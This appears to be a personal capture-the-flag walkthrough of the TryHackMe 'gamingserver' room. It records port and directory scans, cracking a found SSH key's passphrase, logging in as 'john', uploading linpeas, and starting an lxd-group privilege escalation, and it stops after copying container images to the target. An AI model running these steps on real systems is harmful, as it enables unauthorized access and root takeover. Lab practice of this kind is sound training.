https://tryhackme.com/room/gamingserver

`export IP=10.10.93.170`

## nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## gobuster
`gobuster dir -u $IP/ -w /usr/share/wordlists/dirb/common.txt`
```
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

## index.html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

## ssh2john
`python3 ../../tools/ssh2john.py ./secretKey > ./key.txt`

## john password
`john --wordlist=./dict.lst key.txt`
`letmein`

## ssh login
`sudo chgrp 545 ./secretKey`
`chmod 600 ./secretKey`
` sudo ssh -i ./secretKey john@$IP`

## copy linpeas
Copy a file from local to the SSH victim machine
`sudo scp -i ./secretKey ../../tools/linpeas.sh john@$IP:/home/john/linpeas.sh`

## lxd privileges
https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
https://github.com/lxc/distrobuilder/issues/275

Copy to victim
`sudo scp -i ./secretKey /home/martijnkooij/ContainerImages/alpine/lxd.tar.xz john@$IP:/home/john/lxd.tar.xz`
`sudo scp -i ./secretKey /home/martijnkooij/ContainerImages/alpine/rootfs.squashfs john@$IP:/home/john/rootfs.squashfs`